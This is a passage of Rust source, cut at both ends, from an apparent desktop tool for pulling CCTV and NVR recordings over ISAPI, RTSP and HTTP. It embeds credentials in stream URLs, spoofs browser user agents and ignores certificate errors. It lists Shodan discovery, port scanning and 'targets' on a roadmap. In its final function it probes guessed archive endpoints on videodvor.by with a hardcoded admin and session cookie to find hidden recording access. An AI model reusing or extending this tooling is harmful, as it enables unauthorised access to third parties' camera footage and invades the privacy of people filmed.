        .map_err(|e| format!("FFmpeg semaphore acquire failed: {}", e))?;
    push_runtime_log(log_state, format!("FFMPEG_SLOT_ACQUIRED|{}|rtsp", task_key));

    let authed_uri = inject_rtsp_credentials(uri, login, pass);
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("isapi_rtsp_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("isapi")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let started = std::time::Instant::now();
    let has_time_range = uri.contains("starttime=") || uri.contains("endtime=");
    let duration_limit = if has_time_range { 600u64 } else { 120 };

    let mut child = Command::new("ffmpeg")
        .args([
            "-y",
            "-rtsp_transport",
            "tcp",
            "-i",
            &authed_uri,
            "-t",
            &duration_limit.to_string(),
            "-c",
            "copy",
            "-movflags",
            "+faststart",
            path.to_str().unwrap(),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("Не удалось запустить FFmpeg для RTSP: {}", e))?;

    let mut last_size: u64 = 0;
    let timeout = Duration::from_secs(duration_limit + 60);

    loop {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(task_key))
            .unwrap_or(false)
        {
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(task_key);
            }
            drop(permit);
            return Err(format!("Захват RTSP отменён [task:{}]", task_key));
        }

        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    let _ = std::fs::remove_file(&path);
                    drop(permit);
                    return Err(format!(
                        "FFmpeg RTSP capture failed with status: {}",
                        status
                    ));
                }
                break;
            }
            Ok(None) => {
                if let Ok(m) = std::fs::metadata(&path) {
                    let sz = m.len();
                    if sz > last_size + 1024 * 1024 {
                        push_runtime_log(
                            log_state,
                            format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, sz),
                        );
                        last_size = sz;
                    }
                }
                if started.elapsed() > timeout {
                    let _ = child.kill();
                    let _ = child.wait();
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(500));
            }
            Err(e) => {
                drop(permit);
                return Err(format!("Ошибка FFmpeg: {}", e));
            }
        }
    }

    let file_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    drop(permit);

    Ok(DownloadReport {
        server_alias: "isapi_rtsp".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written: file_size,
        total_bytes: file_size,
        duration_ms: started.elapsed().as_millis(),
        resumed: false,
        skipped_as_complete: false,
    })
}

async fn try_isapi_download_post_xml(
    client: &reqwest::Client,
    endpoint: &str,
    playback_uri: &str,
    login: &str,
    pass: &str,
    task_key: &str,
    log_state: &State<'_, LogState>,
) -> Result<reqwest::Response, String> {
    let playback_uri_xml = playback_uri
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;");

    let body_variants = [
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?><downloadRequest version="1.0" xmlns="http://www.hikvision.com/ver20/XMLSchema"><playbackURI>{}</playbackURI></downloadRequest>"#,
            playback_uri_xml
        ),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?><downloadRequest><playbackURI>{}</playbackURI></downloadRequest>"#,
            playback_uri_xml
        ),
    ];
    let content_types = [
        "application/xml; charset=UTF-8",
        "application/x-www-form-urlencoded; charset=UTF-8",
    ];

    let mut last_err = String::new();

    for body in body_variants.iter() {
        for ct in content_types.iter() {
            let mut resp = client
                .post(endpoint)
                .header("Content-Type", *ct)
                .header("Accept", "*/*")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
                .basic_auth(login, Some(pass))
                .body(body.clone())
                .send()
                .await
                .map_err(|e| e.to_string())?;

            if resp.status().as_u16() == 401 {
                let www_auth = resp
                    .headers()
                    .get(reqwest::header::WWW_AUTHENTICATE)
                    .and_then(|h| h.to_str().ok())
                    .map(|s| s.to_string());

                if let Some(www_auth) = www_auth {
                    if let Ok(mut prompt) = digest_auth::parse(&www_auth) {
                        let mut ctx = digest_auth::AuthContext::new(
                            login.to_string(),
                            pass.to_string(),
                            "/ISAPI/ContentMgmt/download".to_string(),
                        );
                        ctx.method = digest_auth::HttpMethod::POST;

                        if let Ok(answer) = prompt.respond(&ctx) {
                            push_runtime_log(
                                log_state,
                                format!(
                                    "ISAPI HTTP POST download got 401, retrying with Digest auth [task:{}]",
                                    task_key
                                ),
                            );
                            resp = client
                                .post(endpoint)
                                .header("Authorization", answer.to_string())
                                .header("Content-Type", *ct)
                                .header("Accept", "*/*")
                                .header("X-Requested-With", "XMLHttpRequest")
                                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
                                .body(body.clone())
                                .send()
                                .await
                                .map_err(|e| e.to_string())?;
                        }
                    }
                }
            }

            if resp.status().is_success() {
                return Ok(resp);
            }

            let code = resp.status().as_u16();
            let text = resp.text().await.unwrap_or_default();
            let preview = text
                .split_whitespace()
                .take(28)
                .collect::<Vec<_>>()
                .join(" ");
            last_err = format!(
                "POST /download failed ct={} status={} preview='{}'",
                ct, code, preview
            );
            push_runtime_log(
                log_state,
                format!(
                    "ISAPI HTTP POST download attempt failed: {} [task:{}]",
                    last_err, task_key
                ),
            );
        }
    }

    Err(last_err)
}

async fn send_isapi_http_get_with_retry(
    client: &reqwest::Client,
    uri: &str,
    login: &str,
    pass: &str,
    task_key: &str,
    log_state: &State<'_, LogState>,
    range_start: Option<u64>,
    authorization: Option<String>,
) -> Result<reqwest::Response, String> {
    let mut attempt: u8 = 0;
    loop {
        attempt += 1;
        let mut req = client
            .get(uri)
            .header("Accept", "*/*")
            .header("X-Requested-With", "XMLHttpRequest")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36");

        if let Some(start) = range_start {
            req = req.header("Range", format!("bytes={}-", start));
        }

        if let Some(ref auth) = authorization {
            req = req.header("Authorization", auth.clone());
        } else {
            req = req.basic_auth(login, Some(pass));
        }

        match req.send().await {
            Ok(resp) => return Ok(resp),
            Err(e) => {
                let msg = e.to_string();
                let retryable = msg
                    .to_ascii_lowercase()
                    .contains("connection closed before message completed")
                    || msg
                        .to_ascii_lowercase()
                        .contains("error sending request for url");
                if retryable && attempt < 4 {
                    push_runtime_log(
                        log_state,
                        format!(
                            "ISAPI HTTP request send failed, retry {}/3: {} [task:{}]",
                            attempt, msg, task_key
                        ),
                    );
                    tokio::time::sleep(Duration::from_millis(350 * attempt as u64)).await;
                    continue;
                }
                return Err(msg);
            }
        }
    }
}

/// HTTP ветка: скачивание через reqwest (оригинальная логика)
async fn download_isapi_via_http(
    uri: &str,
    login: &str,
    pass: &str,
    filename_hint: Option<String>,
    task_key: &str,
    log_state: &State<'_, LogState>,
    cancel_state: &State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(60))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0")
        .build()
        .map_err(|e| e.to_string())?;

    let started = std::time::Instant::now();
    push_runtime_log(
        log_state,
        format!(
            "ISAPI HTTP GET download started: {} [task:{}]",
            uri, task_key
        ),
    );

    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("isapi_record_{}.mp4", Utc::now().timestamp()));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("isapi")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let parsed_uri = reqwest::Url::parse(uri).map_err(|e| e.to_string())?;
    let host = parsed_uri
        .host_str()
        .ok_or_else(|| "ISAPI URI без host".to_string())?;
    let port = parsed_uri.port_or_known_default().unwrap_or(80);

    let mut request_url = reqwest::Url::parse(&format!(
        "http://{}:{}/ISAPI/ContentMgmt/download",
        host, port
    ))
    .map_err(|e| e.to_string())?;

    let clean_uri = uri.replace("&amp;", "&");
    request_url
        .query_pairs_mut()
        .append_pair("playbackURI", &clean_uri);

    let mut current_offset = 0u64;
    let mut total_size = 0u64;
    let mut retries = 0u8;
    let mut digest_cache: Option<String> = None;

    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let progress_step = 2 * 1024 * 1024u64;
    let mut next_mark = progress_step;

    loop {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            return Err("Отменено".into());
        }

        let mut req = client.get(request_url.clone());

        if current_offset > 0 {
            req = req.header("Range", format!("bytes={}-", current_offset));
        }

        if let Some(ref auth) = digest_cache {
            if let Ok(mut prompt) = digest_auth::parse(auth) {
                let mut ctx = digest_auth::AuthContext::new(
                    login.to_string(),
                    pass.to_string(),
                    request_url.path().to_string(),
                );
                ctx.method = digest_auth::HttpMethod::GET;
                if let Ok(answer) = prompt.respond(&ctx) {
                    req = req.header("Authorization", answer.to_string());
                }
            }
        } else {
            req = req.basic_auth(login, Some(pass));
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();

                if status == 401 {
                    retries = retries.saturating_add(1);
                    if let Some(auth) = resp
                        .headers()
                        .get("WWW-Authenticate")
                        .and_then(|h| h.to_str().ok())
                    {
                        digest_cache = Some(auth.to_string());
                    }
                    if retries > 5 {
                        return Err("NVR error HTTP 401 (Digest re-auth retries exceeded)".into());
                    }
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    continue;
                }

                if !resp.status().is_success() {
                    if retries > 3 {
                        return Err(format!("NVR error HTTP {}", status));
                    }
                    retries += 1;
                    tokio::time::sleep(Duration::from_secs(3)).await;
                    continue;
                }

                retries = 0;
                if total_size == 0 {
                    total_size = resp.content_length().unwrap_or(0) + current_offset;
                }

                let mut stream = resp.bytes_stream();
                while let Some(chunk) = stream.next().await {
                    if cancel_state
                        .cancelled_tasks
                        .lock()
                        .map(|set| set.contains(task_key))
                        .unwrap_or(false)
                    {
                        let _ = std::fs::remove_file(&path);
                        return Err("Отменено".into());
                    }

                    match chunk {
                        Ok(data) => {
                            std::io::Write::write_all(&mut file, &data)
                                .map_err(|e| e.to_string())?;
                            current_offset += data.len() as u64;

                            if current_offset >= next_mark {
                                push_runtime_log(
                                    log_state,
                                    format!(
                                        "DOWNLOAD_PROGRESS|{}|{}|{}",
                                        task_key,
                                        current_offset,
                                        total_size.max(current_offset)
                                    ),
                                );
                                next_mark = current_offset + progress_step;
                            }
                        }
                        Err(_) => {
                            break;
                        }
                    }
                }

                if current_offset >= total_size && total_size > 0 {
                    break;
                }
            }
            Err(e) => {
                if retries > 3 {
                    return Err(format!("Connection failed: {}", e));
                }
                retries += 1;
                tokio::time::sleep(Duration::from_secs(3)).await;
            }
        }
    }

    push_runtime_log(
        log_state,
        format!("ISAPI HTTP download finished: {} bytes", current_offset),
    );

    Ok(DownloadReport {
        server_alias: "isapi_http".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written: current_offset,
        total_bytes: total_size.max(current_offset),
        duration_ms: started.elapsed().as_millis(),
        resumed: false,
        skipped_as_complete: false,
    })
}

#[tauri::command]
async fn capture_archive_segment(
    source_url: String,
    filename_hint: Option<String>,
    duration_seconds: Option<u64>,
    extra_headers: Option<String>,
    task_id: Option<String>,
    login: Option<String>,
    pass: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
    ffmpeg_limiter: State<'_, FfmpegLimiterState>,
) -> Result<DownloadReport, String> {
    if source_url.trim().is_empty() {
        return Err("Пустой source_url".into());
    }
    let task_key = task_id.unwrap_or_else(|| format!("capture_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    let permit = ffmpeg_limiter
        .semaphore
        .clone()
        .acquire_owned()
        .await
        .map_err(|e| format!("Не удалось занять слот FFmpeg: {}", e))?;
    let duration = duration_seconds.unwrap_or(60);
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("archive_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("captures")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());
    let output_path = path.to_string_lossy().to_string();

    let log_file_path = get_vault_path()
        .join("archives")
        .join("captures")
        .join(format!("{}.log", filename));

    // 🔥 МАГИЯ ИНЖЕКЦИИ И ИСПРАВЛЕНИЯ ПОРТА + ОЧИСТКА ОТ МУСОРА
    let mut final_url = source_url.clone();
    if final_url.to_lowercase().starts_with("rtsp://") {
        if let Ok(mut parsed) = reqwest::Url::parse(&final_url) {
            // Меняем веб-порт на стандартный RTSP (554)
            if parsed.port() == Some(2019)
                || parsed.port() == Some(80)
                || parsed.port() == Some(8080)
            {
                let _ = parsed.set_port(Some(554));
            }
            // Вшиваем логин и пароль
            if let (Some(l), Some(p)) = (&login, &pass) {
                let _ = parsed.set_username(l);
                let _ = parsed.set_password(Some(p));
            }
            // 🔪 ХИРУРГИЯ: Вырезаем мусорные параметры size и name, из-за которых NVR выдает ОШИБКУ 400!
            let mut keep_pairs = Vec::new();
            for (k, v) in parsed.query_pairs() {
                if k != "size" && k != "name" {
                    keep_pairs.push((k.into_owned(), v.into_owned()));
                }
            }
            parsed.set_query(None);
            for (k, v) in keep_pairs {
                parsed.query_pairs_mut().append_pair(&k, &v);
            }

            final_url = parsed.to_string();
        }
    }

    let masked_url = match reqwest::Url::parse(&final_url) {
        Ok(mut u) => {
            let has_user = !u.username().is_empty();
            if has_user {
                let _ = u.set_password(Some("***"));
            }
            u.to_string()
        }
        Err(_) => final_url.clone(),
    };
    push_runtime_log(&log_state, format!("CAPTURE SMART URL: {}", masked_url));

    let mut args: Vec<String> = Vec::new();
    let source_lc = final_url.to_lowercase();
    if source_lc.starts_with("rtsp://") {
        args.extend_from_slice(&["-rtsp_transport".into(), "tcp".into()]);
    } else {
        args.extend_from_slice(&[
            "-reconnect".into(),
            "1".into(),
            "-reconnect_at_eof".into(),
            "1".into(),
            "-reconnect_streamed".into(),
            "1".into(),
            "-reconnect_delay_max".into(),
            "5".into(),
        ]);
        if let Some(ref h) = extra_headers {
            args.extend_from_slice(&["-headers".into(), h.clone()]);
        }
    }

    args.extend_from_slice(&[
        "-y".into(),
        "-i".into(),
        final_url,
        "-t".into(),
        duration.to_string(),
        "-c".into(),
        "copy".into(),
        "-movflags".into(),
        "+faststart".into(),
        output_path.clone(),
    ]);

    let log_file = std::fs::File::create(&log_file_path).map_err(|e| e.to_string())?;

    let mut child = Command::new("ffmpeg")
        .args(&args)
        .stdout(Stdio::null())
        .stderr(Stdio::from(log_file))
        .spawn()
        .map_err(|e| format!("Не удалось запустить FFmpeg: {}", e))?;

    let started = std::time::Instant::now();
    let mut last_progress = std::time::Instant::now();
    let mut last_size: u64 = 0;

    loop {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|s| s.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_file(&path);
            drop(permit);
            return Err("Захват отменён".into());
        }

        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    let err_log = std::fs::read_to_string(&log_file_path).unwrap_or_default();
                    let tail = err_log
                        .lines()
                        .rev()
                        .take(3)
                        .collect::<Vec<_>>()
                        .into_iter()
                        .rev()
                        .collect::<Vec<_>>()
                        .join(" | ");

                    if err_log.contains("Invalid data")
                        || err_log.contains("codec not currently supported")
                    {
                        push_runtime_log(
                            &log_state,
                            "FFmpeg copy failed, retrying with re-encode (H.264 + AAC)".to_string(),
                        );

                        // 🔥 ИСПРАВЛЕНИЕ: Четко разделяем видео (libx264) и аудио (aac)
                        let mut retry_args = Vec::new();
                        let mut i = 0;
                        while i < args.len() {
                            if args[i] == "-c" && i + 1 < args.len() && args[i + 1] == "copy" {
                                retry_args.push("-c:v".into());
                                retry_args.push("libx264".into());
                                retry_args.push("-preset".into());
                                retry_args.push("fast".into());
                                retry_args.push("-crf".into());
                                retry_args.push("28".into());
                                retry_args.push("-c:a".into());
                                retry_args.push("aac".into());
                                i += 2;
                            } else {
                                retry_args.push(args[i].clone());
                                i += 1;
                            }
                        }

                        let log_file2 = std::fs::File::create(&log_file_path)
                            .map_err(|e| format!("Ошибка создания лога: {}", e))?;
                        let mut child2 = Command::new("ffmpeg")
                            .args(&retry_args)
                            .stdout(Stdio::null())
                            .stderr(Stdio::from(log_file2))
                            .spawn()
                            .map_err(|e| format!("Ошибка перезапуска FFmpeg: {}", e))?;

                        let timeout_secs = duration + 30;
                        loop {
                            if cancel_state
                                .cancelled_tasks
                                .lock()
                                .map(|s| s.contains(&task_key))
                                .unwrap_or(false)
                            {
                                let _ = child2.kill();
                                let _ = child2.wait();
                                let _ = std::fs::remove_file(&path);
                                drop(permit);
                                return Err("Захват отменён".into());
                            }

                            match child2.try_wait() {
                                Ok(Some(status2)) => {
                                    if !status2.success() {
                                        let err_log2 = std::fs::read_to_string(&log_file_path)
                                            .unwrap_or_default();
                                        let tail2 = err_log2
                                            .lines()
                                            .rev()
                                            .take(3)
                                            .collect::<Vec<_>>()
                                            .into_iter()
                                            .rev()
                                            .collect::<Vec<_>>()
                                            .join(" | ");
                                        drop(permit);
                                        return Err(format!("FFmpeg re-encode error: {}", tail2));
                                    }
                                    break;
                                }
                                Ok(None) => {}
                                Err(e) => {
                                    drop(permit);
                                    return Err(format!("Ошибка ожидания FFmpeg re-encode: {}", e));
                                }
                            }

                            if started.elapsed() > std::time::Duration::from_secs(timeout_secs) {
                                let _ = child2.kill();
                                let _ = child2.wait();
                                drop(permit);
                                return Err("FFmpeg re-encode timeout".into());
                            }
                            tokio::time::sleep(Duration::from_millis(500)).await;
                        }
                    } else {
                        drop(permit);
                        return Err(format!("FFmpeg error: {}", tail));
                    }
                }
                break;
            }
            Ok(None) => {}
            Err(e) => {
                drop(permit);
                return Err(format!("Ошибка ожидания FFmpeg: {}", e));
            }
        }

        if last_progress.elapsed() >= std::time::Duration::from_secs(2) {
            let current_size = std::fs::metadata(&path)
                .map(|m| m.len())
                .unwrap_or(last_size);
            if current_size > last_size {
                push_runtime_log(
                    &log_state,
                    format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, current_size),
                );
                last_size = current_size;
            }
            last_progress = std::time::Instant::now();
        }

        if started.elapsed() > std::time::Duration::from_secs(duration + 30) {
            let _ = child.kill();
            let _ = child.wait();
            break;
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }

    let bytes_written = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    drop(permit);
    if bytes_written == 0 {
        let _ = std::fs::remove_file(&path);
        return Err("Нет данных от источника. Проверьте правильность порта.".into());
    }

    Ok(DownloadReport {
        server_alias: "capture".into(),
        filename,
        save_path: output_path,
        bytes_written,
        total_bytes: bytes_written,
        duration_ms: started.elapsed().as_millis(),
        resumed: false,
        skipped_as_complete: false,
    })
}

#[tauri::command]
fn get_implementation_status() -> Result<ImplementationStatus, String> {
    let items = vec![
        RoadmapItem {
            name: "Vault encryption + sled storage".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Live stream engine (RTSP/MJPEG -> HLS)".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Hub/Shodan/Videodvor discovery".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "FTP resilience (banner/retry/resume)".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Automatic host service/port scanner".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "ISAPI/ONVIF archive extraction".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Download manager UX (queue/cancel/persist)".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Map filtering for >100 targets".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Embedded runtime logs terminal".into(),
            status: "completed".into(),
        },
    ];

    let total = items.len();
    let completed = items.iter().filter(|i| i.status == "completed").count();
    let in_progress = items.iter().filter(|i| i.status == "in_progress").count();
    let pending = items.iter().filter(|i| i.status == "pending").count();

    Ok(ImplementationStatus {
        total,
        completed,
        in_progress,
        pending,
        left: total.saturating_sub(completed),
        items,
    })
}

/// HTTP-скачивание файла по прямой ссылке с прогрессом
/// Универсальный метод для ISAPI playback URI, HUB download links и любых HTTP-источников
#[tauri::command]
async fn download_http_archive(
    url: String,
    login: Option<String>,
    pass: Option<String>,
    extra_cookie: Option<String>,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    if url.trim().is_empty() {
        return Err("Пустой URL".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("http_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(
        &log_state,
        format!("HTTP download: {} [task:{}]", url, task_key),
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(300))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .map_err(|e| e.to_string())?;

    let mut request = client.get(&url);

    if let (Some(ref l), Some(ref p)) = (&login, &pass) {
        request = request.basic_auth(l, Some(p));
    }
    if let Some(ref cookie) = extra_cookie {
        request = request.header("Cookie", cookie.as_str());
    }

    let started = std::time::Instant::now();
    let resp = request.send().await.map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!("HTTP {} для {}", resp.status().as_u16(), url));
    }

    let total_size = resp.content_length().unwrap_or(0);

    // Определяем имя файла из Content-Disposition или hint
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            // Пробуем из Content-Disposition
            resp.headers()
                .get("content-disposition")
                .and_then(|v| v.to_str().ok())
                .and_then(|v| {
                    v.split("filename=")
                        .nth(1)
                        .map(|s| s.trim_matches('"').trim_matches('\'').to_string())
                })
                .map(|s| sanitize_filename_component(&s))
                .filter(|s| !s.is_empty())
                .unwrap_or_else(|| format!("download_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")))
        });
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("http")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 1024 * 1024u64; // Прогресс каждый МБ
    let mut next_progress_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!("Загрузка отменена [task:{}]", task_key));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    bytes_written,
                    total_size.max(bytes_written)
                ),
            );
            next_progress_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(
        &log_state,
        format!(
            "HTTP download finished: {} ({} bytes, {}ms) [task:{}]",
            filename, bytes_written, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: "http".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

// =============================================================================
// РАЗВЕДКА АРХИВНЫХ МАРШРУТОВ ХАБА (videodvor.by)
// =============================================================================

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ArchiveRouteProbe {
    url: String,
    method: String,
    status_code: u16,
    content_type: String,
    content_length: u64,
    is_video: bool,
    is_redirect: bool,
    redirect_to: String,
    body_preview: String,
    verdict: String,
}

/// Глубокая разведка: прощупываем ВСЕ известные паттерны videodvor.by
/// для поиска архивного доступа (не live, а запись за дату/время).
///
/// Логика: rtsp2mjpeg.php уже работает для live. Значит PHP-бэкенд
/// проксирует видеопотоки. Нужно найти параметры, которые переключают
/// его на архивный режим (дата, время, cam id, файловый путь).
#[tauri::command]
async fn recon_hub_archive_routes(
    user_id: String,
    channel_id: String,
    admin_hash: String,
    target_date: Option<String>,
    target_ftp_path: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<ArchiveRouteProbe>, String> {
    push_runtime_log(
        &log_state,
        format!("🔍 РАЗВЕДКА АРХИВА: user={}, ch={}", user_id, channel_id),
    );

    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(15))
        .redirect(reqwest::redirect::Policy::none()) // Не следуем за редиректами — ловим их
        .build()
        .map_err(|e| e.to_string())?;

    let cookie = format!(
        "login=mvd; admin={}; PHPSESSID=d8qtnapeqlgrism37hkarq9mk5",
        admin_hash
    );
    let date = target_date.unwrap_or_else(|| "2026-02-19".to_string());
    let ftp_path =
        target_ftp_path.unwrap_or_else(|| format!("video0/[Minsk_cam{}]/{}/ ", channel_id, date));

    let mut results = Vec::new();

    // =====================================================
    // ФАЗА 1: Вариации rtsp2mjpeg.php (уже работает для live)
    // =====================================================
    let rtsp_variants = vec![
        // Стандартный live
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}", user_id, channel_id),
        // Пробуем архивные параметры
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&time={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&archive=1&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&mode=archive&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&playback={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&rec={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&from={}T00:00:00&to={}T23:59:59", user_id, channel_id, date, date),
    ];

    // =====================================================
    // ФАЗА 2: check.php — центральный роутер
    // =====================================================
    let check_variants = vec![
        format!(
            "https://videodvor.by/stream/check.php?user={}&cam={}",
            user_id, channel_id
        ),
        format!(
            "https://videodvor.by/stream/check.php?user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        format!(
            "https://videodvor.by/stream/check.php?user={}&cam={}&archive=1",
            user_id, channel_id
        ),
        format!(
            "https://videodvor.by/stream/check.php?search=user{}",
            user_id
        ),
        format!(
            "https://videodvor.by/stream/check.php?action=archive&user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        format!(
            "https://videodvor.by/stream/check.php?action=get_video&user={}&cam={}",
            user_id, channel_id
        ),
        format!(
            "https://videodvor.by/stream/check.php?action=download&user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
    ];

    // =====================================================
    // ФАЗА 3: Другие PHP-скрипты
    // =====================================================
    let other_endpoints = vec![
        format!(
            "https://videodvor.by/stream/ajax.php?action=archive&user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        format!(
            "https://videodvor.by/stream/ajax.php?action=get_archive&user={}&id={}",
            user_id, channel_id
        ),
        format!(
            "https://videodvor.by/stream/ajax.php?action=list_archive&user={}&cam={}",
            user_id, channel_id
        ),
        format!(
            "https://videodvor.by/stream/video.php?user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        format!(
            "https://videodvor.by/stream/archive.php?user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        format!(
            "https://videodvor.by/stream/download.php?user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        format!(
            "https://videodvor.by/stream/stream.php?user={}&cam={}&date={}&archive=1",
            user_id, channel_id, date
        ),
